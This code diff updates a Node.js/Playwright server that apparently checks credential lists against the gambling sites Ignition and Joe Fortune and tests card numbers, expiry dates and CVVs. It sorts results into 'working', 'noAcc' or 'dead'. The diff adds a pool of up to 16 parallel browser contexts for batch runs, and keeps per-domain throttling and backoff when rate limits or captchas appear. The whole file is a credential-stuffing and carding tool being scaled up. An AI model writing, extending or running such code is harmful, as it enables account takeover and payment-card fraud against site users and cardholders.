@@ -37,12 +37,16 @@ const SHOTS_DIR    = path.join(__dirname, 'debug-shots');
 const SESSIONS_DIR = path.join(__dirname, 'sessions');
 /** Root folder for structured JSONL logs (one line per event). */
 const LOGS_DIR     = path.join(__dirname, 'logs');
-for (const d of [SHOTS_DIR, SESSIONS_DIR, LOGS_DIR]) {
+/** Root folder for per-run raw HTML snapshots (one file per screenshot slot). */
+const RUNS_DIR     = path.join(__dirname, 'runs');
+for (const d of [SHOTS_DIR, SESSIONS_DIR, LOGS_DIR, RUNS_DIR]) {
   try { fs.mkdirSync(d, { recursive: true }); } catch {}
 }
 // Serve screenshots at /shots/<runId>/<file>.png so the webapp can load them
 // directly from disk rather than carrying multi-MB base64 blobs in localStorage.
 app.use('/shots', express.static(SHOTS_DIR, { maxAge: '1h' }));
+// Serve raw HTML artefacts at /runs/<runId>/<idx>.html for forensic debugging.
+app.use('/runs',  express.static(RUNS_DIR,  { maxAge: '1h' }));
 
 // ── Structured Logger (JSONL) ────────────────────────────────────────────────
 /** Current log file path — rolls per day so a single file never gets huge. */
@@ -221,18 +225,19 @@ const NAV_TIMEOUT = 30000;
 /** How long to wait after submitting a form before taking a screenshot. */
 const POST_SUBMIT_WAIT = 3000;
 
-// ── Single-Browser Serial Mutex ──────────────────────────────────────────────
-// Hard guarantee: only ONE Chromium process / one automation runs at a time.
-// Every /api/login-check and /api/card-check call queues behind this mutex
-// and runs strictly sequentially. The user can watch each run live without
-// multiple browser windows fighting for focus.
-let _automationChain = Promise.resolve();
-function runExclusive(fn) {
-  const next = _automationChain.then(() => fn(), () => fn());
-  // Swallow rejections in the chain so one failure doesn't poison the queue.
-  _automationChain = next.catch(() => {});
-  return next;
-}
+// ── Concurrency Pool Config (Swarm Upgrade v1) ───────────────────────────────
+/**
+ * Upper bound for the headless context pool. The old build hard-serialised every
+ * run behind a single Chromium process; we now fan out across N reusable
+ * contexts sharing the same warm browser. Headed (liveView) mode stays single-
+ * slot so the user can still watch one live window without fighting for focus.
+ *
+ * Tunable at runtime by POSTing { maxConcurrent: N } to /api/pool/config.
+ */
+const POOL_MAX_ABS = 16;
+const POOL_MAX_DEFAULT = 12;
+let POOL_MAX_HEADLESS = POOL_MAX_DEFAULT;
+const POOL_MAX_HEADED   = 1;
 
 // ── Persistent Browser Pool ──────────────────────────────────────────────────
 /**
@@ -280,8 +285,196 @@ async function shutdownBrowserPool() {
     }
   }
 }
-process.once('SIGINT',  () => shutdownBrowserPool().finally(() => process.exit(0)));
-process.once('SIGTERM', () => shutdownBrowserPool().finally(() => process.exit(0)));
+async function _shutdownAll() {
+  await drainContextPool().catch(() => {});
+  await shutdownBrowserPool().catch(() => {});
+}
+process.once('SIGINT',  () => _shutdownAll().finally(() => process.exit(0)));
+process.once('SIGTERM', () => _shutdownAll().finally(() => process.exit(0)));
+
+// ── Context Lease Pool (Swarm Upgrade v1) ────────────────────────────────────
+/**
+ * Lease-based context pool: one pool per mode (headless / headed). Callers
+ * acquire a context via leaseContext(), do their work, then release. Released
+ * contexts are wiped (cookies cleared) and pushed back onto the idle stack for
+ * the next lease to grab — avoids the ~100–200ms cost of creating a fresh
+ * context every run. Bounded by POOL_MAX_* so we never exceed the user's
+ * configured concurrency.
+ *
+ * `needsFreshState: true` (e.g. a run needs a specific storageState) forces a
+ * freshly-created context that will be destroyed rather than returned.
+ */
+const ctxPool = {
+  headless: { idle: [], waiters: [], active: 0 },
+  headed:   { idle: [], waiters: [], active: 0 },
+};
+
+function _poolCapFor(mode) { return mode === 'headed' ? POOL_MAX_HEADED : POOL_MAX_HEADLESS; }
+
+async function _newContext(browser, live) {
+  return browser.newContext({
+    viewport: live ? { width: 540, height: 420 } : { width: 1280, height: 800 },
+    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
+    ignoreHTTPSErrors: true,
+  });
+}
+
+/**
+ * Acquire a context from the pool. Resolves with { context, mode, fresh } where
+ * `fresh` signals the caller must apply any storageState themselves (only true
+ * when `needsFreshState` was requested).
+ *
+ * @param {{live?:boolean, needsFreshState?:boolean, signal?:AbortSignal}} opts
+ * @returns {Promise<{context: import('playwright').BrowserContext, mode: 'headless'|'headed', fresh: boolean}>}
+ */
+async function leaseContext({ live = false, needsFreshState = false, signal } = {}) {
+  const mode = live ? 'headed' : 'headless';
+  const pool = ctxPool[mode];
+
+  // Pre-flight: bail early if already cancelled.
+  if (signal?.aborted) throw new Error('lease cancelled');
+
+  // Fresh-state requests bypass the idle stack but still count against the cap.
+  if (needsFreshState) {
+    await _waitForSlot(pool, mode, signal);
+    const browser = await getBrowser(live);
+    const context = await _newContext(browser, live);
+    pool.active++;
+    return { context, mode, fresh: true };
+  }
+
+  // Try idle stack first.
+  if (pool.idle.length > 0) {
+    const context = pool.idle.pop();
+    pool.active++;
+    return { context, mode, fresh: false };
+  }
+
+  // Grow pool up to cap.
+  if (pool.active + pool.idle.length < _poolCapFor(mode)) {
+    const browser = await getBrowser(live);
+    const context = await _newContext(browser, live);
+    pool.active++;
+    return { context, mode, fresh: false };
+  }
+
+  // At cap — queue.
+  return new Promise((resolve, reject) => {
+    const waiter = { resolve, reject, signal };
+    pool.waiters.push(waiter);
+    if (signal) {
+      signal.addEventListener('abort', () => {
+        const i = pool.waiters.indexOf(waiter);
+        if (i !== -1) pool.waiters.splice(i, 1);
+        reject(new Error('lease cancelled'));
+      }, { once: true });
+    }
+  });
+}
+
+async function _waitForSlot(pool, mode, signal) {
+  while (pool.active + pool.idle.length >= _poolCapFor(mode)) {
+    if (signal?.aborted) throw new Error('lease cancelled');
+    if (pool.idle.length > 0) {
+      const ctx = pool.idle.pop();
+      try { await ctx.close(); } catch {}
+      return; // freed one slot
+    }
+    await new Promise((resolve, reject) => {
+      const waiter = { resolve: () => resolve(), reject, signal, _waitOnly: true };
+      pool.waiters.push(waiter);
+      if (signal) signal.addEventListener('abort', () => {
+        const i = pool.waiters.indexOf(waiter);
+        if (i !== -1) pool.waiters.splice(i, 1);
+        reject(new Error('lease cancelled'));
+      }, { once: true });
+    });
+  }
+}
+
+/**
+ * Release a previously-leased context. When `destroy` is true the context is
+ * closed outright (used on cancellation, error, or fresh-state runs); otherwise
+ * it is wiped and returned to the idle stack for reuse.
+ */
+async function releaseContext(lease, { destroy = false } = {}) {
+  if (!lease) return;
+  const pool = ctxPool[lease.mode];
+  pool.active = Math.max(0, pool.active - 1);
+
+  const shouldDestroy = destroy || lease.fresh || !lease.context || !lease.context.browser();
+  if (shouldDestroy) {
+    try { await lease.context.close(); } catch {}
+  } else {
+    // Wipe transient state so the next caller starts clean.
+    try { await lease.context.clearCookies(); } catch {}
+    try { await lease.context.clearPermissions?.(); } catch {}
+    // Close any lingering pages; next caller always creates its own page.
+    try {
+      const pages = lease.context.pages();
+      await Promise.all(pages.map(p => p.close().catch(() => {})));
+    } catch {}
+    pool.idle.push(lease.context);
+  }
+
+  // Wake the next waiter (if any) by handing them a context. We prefer the
+  // idle stack (hot reuse) but also grow the pool if slots are free.
+  while (pool.waiters.length > 0) {
+    const w = pool.waiters.shift();
+    if (w._waitOnly) { try { w.resolve(); } catch {} return; }
+    if (pool.idle.length > 0) {
+      const context = pool.idle.pop();
+      pool.active++;
+      try { w.resolve({ context, mode: lease.mode, fresh: false }); } catch {}
+      return;
+    }
+    // No idle context but slot free — caller asked for a fresh-ish lease;
+    // just resolve — they'll create one.
+    if (pool.active + pool.idle.length < _poolCapFor(lease.mode)) {
+      try {
+        const browser = await getBrowser(lease.mode === 'headed');
+        const context = await _newContext(browser, lease.mode === 'headed');
+        pool.active++;
+        w.resolve({ context, mode: lease.mode, fresh: false });
+      } catch (err) { w.reject(err); }
+      return;
+    }
+  }
+}
+
+/** Drain and destroy every pooled context (called on shutdown). */
+async function drainContextPool() {
+  for (const mode of ['headless', 'headed']) {
+    const pool = ctxPool[mode];
+    const idle = pool.idle.splice(0);
+    await Promise.all(idle.map(c => c.close().catch(() => {})));
+    // Reject any pending waiters so they don't hang forever.
+    for (const w of pool.waiters.splice(0)) {
+      try { w.reject(new Error('pool draining')); } catch {}
+    }
+    pool.active = 0;
+  }
+}
+
+// POST /api/pool/config { maxConcurrent: N }
+app.post('/api/pool/config', express.json(), (req, res) => {
+  const n = parseInt(req.body?.maxConcurrent, 10);
+  if (!Number.isFinite(n) || n < 1 || n > POOL_MAX_ABS) {
+    return res.status(400).json({ error: `maxConcurrent must be 1..${POOL_MAX_ABS}` });
+  }
+  POOL_MAX_HEADLESS = n;
+  logEvent('info', 'pool.config', { maxConcurrent: n });
+  broadcast('pool.config', { maxConcurrent: n });
+  res.json({ ok: true, maxConcurrent: POOL_MAX_HEADLESS });
+});
+
+app.get('/api/pool/stats', (_req, res) => {
+  res.json({
+    maxConcurrent: POOL_MAX_HEADLESS,
+    headless: { active: ctxPool.headless.active, idle: ctxPool.headless.idle.length, waiters: ctxPool.headless.waiters.length },
+    headed:   { active: ctxPool.headed.active,   idle: ctxPool.headed.idle.length,   waiters: ctxPool.headed.waiters.length },
+  });
+});
 
 // ── storageState Session Persistence ─────────────────────────────────────────
 /**
@@ -335,17 +528,17 @@ async function clearStoredSession(site, username) {
 // ── Disk Screenshot Helpers ──────────────────────────────────────────────────
 /**
  * Saves a PNG screenshot buffer to disk under debug-shots/<runId>/ and returns
- * a metadata object { path, url, dataUrl }. Keeping a base64 dataUrl in the
- * response preserves backwards compatibility with the existing frontend while
- * giving us a stable disk path for reliable large-batch debugging.
+ * a metadata object { path, url }. The frontend now loads the image by URL
+ * directly from /shots/<runId>/<idx>.png instead of carrying a heavy base64
+ * blob in localStorage — Swarm Upgrade v1 drops the data URL entirely.
  *
  * @param {Buffer|null} buf  - Raw PNG buffer (or null on failure)
  * @param {string} runId     - Run UUID
  * @param {number} idx       - Shot index (1..4)
- * @returns {{path:string, url:string, dataUrl:string}}
+ * @returns {{path:string, url:string}}
  */
 async function persistShotBuffer(buf, runId, idx) {
-  if (!buf) return { path: '', url: '', dataUrl: '' };
+  if (!buf) return { path: '', url: '' };
   const dir = path.join(SHOTS_DIR, runId);
   try { fs.mkdirSync(dir, { recursive: true }); } catch {}
   const filename = `${idx}.png`;
@@ -354,9 +547,37 @@ async function persistShotBuffer(buf, runId, idx) {
     logEvent('warn', 'shot.write.failed', { runId, idx, error: err.message });
   }
   const url = `/shots/${runId}/${filename}`;
-  const dataUrl = `data:image/png;base64,${buf.toString('base64')}`;
   broadcast('shot.saved', { runId, idx, url });
-  return { path: filePath, url, dataUrl };
+  return { path: filePath, url };
+}
+
+/**
+ * Capture and persist the current page's full HTML under runs/<runId>/<idx>.html
+ * alongside every screenshot. The raw HTML is priceless for forensic debugging
+ * when a selector change on the target site breaks automation and the screenshot
+ * alone doesn't reveal what the DOM looked like.
+ *
+ * Never throws — HTML capture failure must never break an automation run.
+ *
+ * @param {import('playwright').Page} page
+ * @param {string} runId
+ * @param {number} idx  - Matching shot index (1..4)
+ * @returns {Promise<{path:string, url:string}>}
+ */
+async function persistRunHtml(page, runId, idx) {
+  if (!page) return { path: '', url: '' };
+  const dir = path.join(RUNS_DIR, runId);
+  try { fs.mkdirSync(dir, { recursive: true }); } catch {}
+  const filename = `${idx}.html`;
+  const filePath = path.join(dir, filename);
+  try {
+    const html = await page.content().catch(() => '');
+    if (html) await fsp.writeFile(filePath, html);
+  } catch (err) {
+    logEvent('warn', 'html.write.failed', { runId, idx, error: err.message });
+  }
+  const url = `/runs/${runId}/${filename}`;
+  return { path: filePath, url };
 }
 
 // ── Network Response Hooks ───────────────────────────────────────────────────
@@ -1092,44 +1313,46 @@ app.post('/api/login-check', async (req, res) => {
     return res.status(400).json({ error: 'Missing username, password, or loginUrl' });
   }
 
-  // Register the run FIRST (outside the mutex) so the client can immediately
-  // see it and cancel it. The actual work still serialises behind the mutex.
+  // Register the run FIRST (outside the pool) so the client can immediately
+  // see it and cancel it. Actual work fans out across the context pool and
+  // respects POOL_MAX_HEADLESS for the headless mode.
   const runHandle = startRun({ site, username, loginUrl, kind: 'login' });
 
   // Domain-aware throttling: respect cooldowns / backoff before starting.
   await applyDomainThrottle(loginUrl);
 
-  await runExclusive(async () => {
+  let lease = null;
+  let destroyContext = false;
   let context;
-  const shotBufs = [null, null, null, null];
   const shotUrls = ['', '', '', ''];
-  const shotDataUrls = ['', '', '', ''];
+  const htmlUrls = ['', '', '', ''];
   let outcome = 'noAcc';
   let note = 'Check did not complete';
   let netSnap = null;
   const host = _hostOf(loginUrl);
   const signal = runHandle.controller.signal;
 
-  /** Persist a shot buf (or null) into slot i and return its dataUrl. */
-  const persist = async (buf, i) => {
-    shotBufs[i] = buf;
-    const meta = await persistShotBuffer(buf, runHandle.runId, i + 1);
-    shotUrls[i]     = meta.url;
-    shotDataUrls[i] = meta.dataUrl;
-    return meta.dataUrl;
+  /** Persist a shot + HTML pair into slot i. Returns nothing — the arrays are populated. */
+  const persist = async (buf, i, page) => {
+    const [shotMeta, htmlMeta] = await Promise.all([
+      persistShotBuffer(buf, runHandle.runId, i + 1),
+      persistRunHtml(page, runHandle.runId, i + 1),
+    ]);
+    shotUrls[i] = shotMeta.url;
+    htmlUrls[i] = htmlMeta.url;
   };
 
   try {
-    // Use the persistent browser pool — re-uses the already-launched Chromium
-    // and avoids the ~1.5s cold start per credential.
-    const browser = await getBrowser(!!liveView);
+    // Session reuse + storageState requires a dedicated context, so it bypasses
+    // the reuse path. Everything else leases from the pool and is returned on
+    // completion — keeps 8-16 contexts warm across a 50-cred batch.
     const storageState = reuseSession ? await loadStorageState(site, username) : undefined;
-    context = await browser.newContext({
-      viewport: liveView ? { width: 540, height: 420 } : { width: 1280, height: 800 },
-      userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
-      ignoreHTTPSErrors: true,
-      storageState,
-    });
+    const needsFreshState = !!storageState;
+    lease = await leaseContext({ live: !!liveView, needsFreshState, signal });
+    context = lease.context;
+    if (storageState) {
+      try { await context.addCookies(storageState.cookies || []); } catch {}
+    }
     runHandle.context = context;
     const page = await context.newPage();
     runHandle.page = page;
@@ -1170,14 +1393,14 @@ app.post('/api/login-check', async (req, res) => {
     } catch (navErr) {
       note = `Navigation failed: ${navErr.message.split('\n')[0]}`;
       const buf = await captureShotBuf(page, 'SCR 1/4').catch(() => null);
-      const du  = await persist(buf, 0);
-      await persist(buf, 1); await persist(buf, 2); await persist(buf, 3);
+      await persist(buf, 0, page);
+      await persist(buf, 1, page); await persist(buf, 2, page); await persist(buf, 3, page);
       logEvent('warn', 'login.nav.failed', { runId: runHandle.runId, site, username, error: navErr.message });
+      destroyContext = true;
       return res.json({
         runId: runHandle.runId,
         outcome: 'noAcc', note,
-        shots: [du, du, du, du],
-        shotUrls,
+        shotUrls, htmlUrls,
       });
     }
     // Ignition takes longer to paint the login overlay + cookie banner.
@@ -1192,7 +1415,7 @@ app.post('/api/login-check', async (req, res) => {
     // SCR 1/4 — 0.7s after the last field click (both fields now filled)
     await page.waitForTimeout(700);
     bail();
-    await persist(await captureShotBuf(page, 'SCR 1/4'), 0);
+    await persist(await captureShotBuf(page, 'SCR 1/4'), 0, page);
 
     // ── Step 2: First submit → SCR 2/4 (2000ms fixed) → poll outcome ─────
     // Screenshot timing is hardcoded: 2000ms after first submit click so the
@@ -1207,7 +1430,7 @@ app.post('/api/login-check', async (req, res) => {
     await page.waitForTimeout(2000); // hardcoded: 2000ms after 1st submit
     await dismissCookiePopup(page);
     bail();
-    await persist(await captureShotBuf(page, 'SCR 2/4'), 1);
+    await persist(await captureShotBuf(page, 'SCR 2/4'), 1, page);
 
     // Poll for outcome — returns immediately if the response is already visible
     respType = await waitForLoginResponse(page, RESPONSE_POLL_MS, site);
@@ -1234,7 +1457,7 @@ app.post('/api/login-check', async (req, res) => {
       await page.waitForTimeout(2500); // hardcoded: 2500ms after 2nd submit
       await dismissCookiePopup(page);
       bail();
-      await persist(await captureShotBuf(page, 'SCR 3/4'), 2);
+      await persist(await captureShotBuf(page, 'SCR 3/4'), 2, page);
 
       respType = await waitForLoginResponse(page, RESPONSE_POLL_MS, site);
 
@@ -1253,7 +1476,7 @@ app.post('/api/login-check', async (req, res) => {
       }
     } else {
       // Outcome already determined after attempt 1 — capture current state for SCR 3/4
-      await persist(await captureShotBuf(page, 'SCR 3/4'), 2);
+      await persist(await captureShotBuf(page, 'SCR 3/4'), 2, page);
     }
 
     // ── Step 4: In-place final state → SCR 4/4 (2000ms settle) ─────────────
@@ -1312,21 +1535,25 @@ app.post('/api/login-check', async (req, res) => {
       }
     }
 
-    await persist(await captureShotBuf(page, 'SCR 4/4'), 3);
+    await persist(await captureShotBuf(page, 'SCR 4/4'), 3, page);
 
-    // ── Network-hook tie-breaker ─────────────────────────────────────────
-    // If DOM heuristics said 'noAcc' but network saw an auth-success JSON
-    // (balance/userId/token in a 2xx response), promote to 'working'.
-    // Conversely if an auth-failure JSON was seen and DOM said 'working',
-    // leave working alone (DOM is stronger). 429 → bump domain backoff.
+    // ── Network-hook tie-breaker (Swarm Upgrade v1 — promoted) ───────────
+    // Network auth JSON is now treated as equal-priority with DOM signals.
+    // A 2xx auth response containing balance/userId/token promotes → 'working'.
+    // A 4xx auth JSON with error/invalid demotes a DOM-only 'working' → 'noAcc'.
+    // 429/captcha → bump domain backoff for future runs.
     if (netSnap) {
       if (netSnap.saw429 || netSnap.sawCaptcha) {
         bumpDomainBackoff(host);
         note += ' (rate-limited / captcha observed)';
       }
-      if (outcome === 'noAcc' && netSnap.authSuccess && !netSnap.authFailure) {
+      if (netSnap.authSuccess && !netSnap.authFailure && outcome !== 'working') {
         outcome = 'working';
         note = `${site === 'ign' ? 'Ignition' : 'Joe Fortune'} — success confirmed by network auth response`;
+      }
+      if (outcome === 'working' && netSnap.authFailure && !netSnap.authSuccess) {
+        outcome = 'noAcc';
+        note = `${site === 'ign' ? 'Ignition' : 'Joe Fortune'} — network returned auth failure JSON; DOM may be stale`;
       }
       if (outcome === 'working') resetDomainBackoff(host);
     }
@@ -1353,23 +1580,24 @@ app.post('/api/login-check', async (req, res) => {
       note = `Automation error: ${err.message}`;
       outcome = 'noAcc';
     }
+    destroyContext = true;
     logEvent('error', 'login.error', { runId: runHandle.runId, site, username, error: err.message });
   } finally {
-    // IMPORTANT: close only the context, NOT the browser — keep the pool warm.
-    if (context) await context.close().catch(() => {});
+    // Return context to pool (or destroy on fresh-state / cancellation / error).
+    if (lease) await releaseContext(lease, { destroy: destroyContext });
     endRun(runHandle, { outcome, site, username });
   }
 
   broadcast('login.result', {
     runId: runHandle.runId, site, username, outcome, note,
-    shotUrls,
+    shotUrls, htmlUrls,
   });
 
   if (!res.headersSent) res.json({
     runId: runHandle.runId,
     outcome, note,
-    shots:    shotDataUrls, // backwards-compatible (base64)
-    shotUrls,                // new: stable disk-served URLs
+    shotUrls,     // stable disk-served URLs (Swarm Upgrade v1: base64 dropped)
+    htmlUrls,     // raw HTML snapshots (one per shot slot)
     network:  netSnap ? {
       saw429: netSnap.saw429,
       sawCaptcha: netSnap.sawCaptcha,
@@ -1378,7 +1606,6 @@ app.post('/api/login-check', async (req, res) => {
       statusCodes: [...netSnap.statusCodes],
     } : null,
   });
-  }); // runExclusive
 });
 
 // ── API: Card Check ───────────────────────────────────────────────────────────
@@ -1414,36 +1641,37 @@ app.post('/api/card-check', async (req, res) => {
   const runHandle = startRun({ kind: 'card', last4: String(number).slice(-4), ppsrUrl });
   await applyDomainThrottle(ppsrUrl);
 
-  // Serialize against the global automation mutex — only one Chromium open
-  // at a time across login + card checks.
-  await runExclusive(async () => {
+  let lease = null;
+  let destroyContext = false;
   let context;
   const shotUrls = ['', '', '', ''];
-  const shotDataUrls = ['', '', '', ''];
+  const htmlUrls = ['', '', '', ''];
   let outcome = 'dead';
   let note = 'Check did not complete';
+  let netSnap = null;
+  const host = _hostOf(ppsrUrl);
   const signal = runHandle.controller.signal;
   const bail = () => { if (signal.aborted) throw new Error('run cancelled'); };
 
-  const persist = async (buf, i) => {
-    const meta = await persistShotBuffer(buf, runHandle.runId, i + 1);
-    shotUrls[i]     = meta.url;
-    shotDataUrls[i] = meta.dataUrl;
-    return meta.dataUrl;
+  const persist = async (buf, i, page) => {
+    const [shotMeta, htmlMeta] = await Promise.all([
+      persistShotBuffer(buf, runHandle.runId, i + 1),
+      persistRunHtml(page, runHandle.runId, i + 1),
+    ]);
+    shotUrls[i] = shotMeta.url;
+    htmlUrls[i] = htmlMeta.url;
   };
 
   try {
-    const browser = await getBrowser(false);
-    context = await browser.newContext({
-      viewport: { width: 1280, height: 800 },
-      userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
-      ignoreHTTPSErrors: true,
-    });
+    // Lease a context from the headless pool — concurrent card checks fan out
+    // up to POOL_MAX_HEADLESS. No live-view mode for card checks.
+    lease = await leaseContext({ live: false, signal });
+    context = lease.context;
     runHandle.context = context;
     const page = await context.newPage();
     runHandle.page = page;
     page.setDefaultTimeout(timeout);
-    attachNetworkHooks(page);
+    netSnap = attachNetworkHooks(page);
 
     // Navigate to check page — if it fails, capture whatever the page shows
     // so the user has visual evidence of the failure mode.
@@ -1453,17 +1681,18 @@ app.post('/api/card-check', async (req, res) => {
     } catch (navErr) {
       note = `Navigation failed: ${navErr.message.split('\n')[0]}`;
       const buf = await captureShotBuf(page, 'SCR 1/4').catch(() => null);
-      const du = await persist(buf, 0);
-      await persist(buf, 1); await persist(buf, 2); await persist(buf, 3);
+      await persist(buf, 0, page);
+      await persist(buf, 1, page); await persist(buf, 2, page); await persist(buf, 3, page);
       logEvent('warn', 'card.nav.failed', { runId: runHandle.runId, error: navErr.message });
-      return res.json({ runId: runHandle.runId, outcome: 'dead', note, shots: [du, du, du, du], shotUrls });
+      destroyContext = true;
+      return res.json({ runId: runHandle.runId, outcome: 'dead', note, shotUrls, htmlUrls });
     }
     await page.waitForTimeout(2000);
     await dismissCookiePopup(page);
 
     // Shot 1: page loaded, form visible
     bail();
-    await persist(await captureShotBuf(page, 'SCR 1/4'), 0);
+    await persist(await captureShotBuf(page, 'SCR 1/4'), 0, page);
 
     // Fill card form
     const filled = await fillCardForm(page, number, mm, yy, cvv);
@@ -1472,7 +1701,7 @@ app.post('/api/card-check', async (req, res) => {
     }
 
     // Shot 2: form filled with card details
-    await persist(await captureShotBuf(page, 'SCR 2/4'), 1);
+    await persist(await captureShotBuf(page, 'SCR 2/4'), 1, page);
 
     // Submit
     const clicked = await clickSubmit(page);
@@ -1490,15 +1719,34 @@ app.post('/api/card-check', async (req, res) => {
 
     // Shot 3: first response after submit
     bail();
-    await persist(await captureShotBuf(page, 'SCR 3/4'), 2);
+    await persist(await captureShotBuf(page, 'SCR 3/4'), 2, page);
 
-    // Determine outcome
+    // Determine outcome from DOM signals
     const result = await determineCardOutcome(page);
     outcome = result.outcome;
     note = result.note;
 
+    // ── Network-hook tie-breaker for card-check ──────────────────────────
+    // Card flows frequently return JSON 4xx with decline/invalid-card strings.
+    // Use network responses as a tie-breaker against the DOM heuristic.
+    if (netSnap) {
+      if (netSnap.saw429 || netSnap.sawCaptcha) {
+        bumpDomainBackoff(host);
+        note += ' (rate-limited / captcha observed)';
+      }
+      if (outcome === 'dead' && netSnap.authSuccess && !netSnap.authFailure) {
+        outcome = 'working';
+        note = 'Card accepted (confirmed by network response JSON)';
+      }
+      if (outcome === 'working' && netSnap.authFailure && !netSnap.authSuccess) {
+        outcome = 'dead';
+        note = 'Card rejected by network response JSON (DOM may be stale)';
+      }
+      if (outcome === 'working') resetDomainBackoff(host);
+    }
+
     // Shot 4: final state
-    await persist(await captureShotBuf(page, 'SCR 4/4'), 3);
+    await persist(await captureShotBuf(page, 'SCR 4/4'), 3, page);
 
   } catch (err) {
     if (signal.aborted) {
@@ -1508,20 +1756,27 @@ app.post('/api/card-check', async (req, res) => {
       note = `Automation error: ${err.message}`;
       outcome = 'dead';
     }
+    destroyContext = true;
     logEvent('error', 'card.error', { runId: runHandle.runId, error: err.message });
   } finally {
-    if (context) await context.close().catch(() => {});
+    if (lease) await releaseContext(lease, { destroy: destroyContext });
     endRun(runHandle, { outcome, kind: 'card' });
   }
 
-  broadcast('card.result', { runId: runHandle.runId, outcome, note, shotUrls });
+  broadcast('card.result', { runId: runHandle.runId, outcome, note, shotUrls, htmlUrls });
   if (!res.headersSent) res.json({
     runId: runHandle.runId,
     outcome, note,
-    shots: shotDataUrls,
     shotUrls,
+    htmlUrls,
+    network: netSnap ? {
+      saw429: netSnap.saw429,
+      sawCaptcha: netSnap.sawCaptcha,
+      authSuccess: netSnap.authSuccess,
+      authFailure: netSnap.authFailure,
+      statusCodes: [...netSnap.statusCodes],
+    } : null,
   });
-  }); // runExclusive
 });
 
 // ── API: Flow Recorder ────────────────────────────────────────────────────────
